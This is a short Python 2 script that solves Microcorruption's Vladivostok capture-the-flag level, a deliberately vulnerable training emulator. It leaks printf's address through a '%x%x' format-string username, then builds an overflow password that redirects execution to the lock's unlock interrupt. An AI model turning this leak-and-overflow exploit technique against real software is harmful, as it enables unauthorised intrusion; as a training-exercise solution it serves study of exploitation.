# Program for Microcorruption's Vladivostok challenge.
import struct  

username = '%x%x'  
# printf_addr = val printed out as username
printf_addr = 0x74c4
# _INT - printf = 0x182
password = ('AA' * 4 + struct.pack('<H', 0x182 + printf_addr) + 'BB' +'\x7f\x00').encode('hex')
print(password)

